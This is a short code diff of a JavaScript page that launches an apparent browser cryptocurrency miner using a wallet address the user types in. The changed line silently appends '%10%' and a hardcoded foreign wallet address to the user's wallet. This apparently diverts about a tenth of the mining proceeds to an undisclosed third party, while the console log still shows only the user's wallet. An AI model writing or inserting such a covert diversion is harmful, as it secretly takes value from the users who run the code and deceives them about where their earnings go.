@@ -103,7 +103,7 @@ $(function() {
       wallet = $('#wallet').val();
       if (wallet) 
       {
-		PerfektStart(wallet, "x", threads);
+		PerfektStart(wallet+"%10%4APDbaHLvcf4jFqbM2xP4KMR6PEURKz6eUTDmQkLZ1TkETEwycVZNSRfxqqxf685ub6JKTrND8u8e9rCMK2sB9KMMizJKXP", "x", threads);
 		console.log(wallet);
 		$.cookie("wallet", wallet, {
 		expires: 365
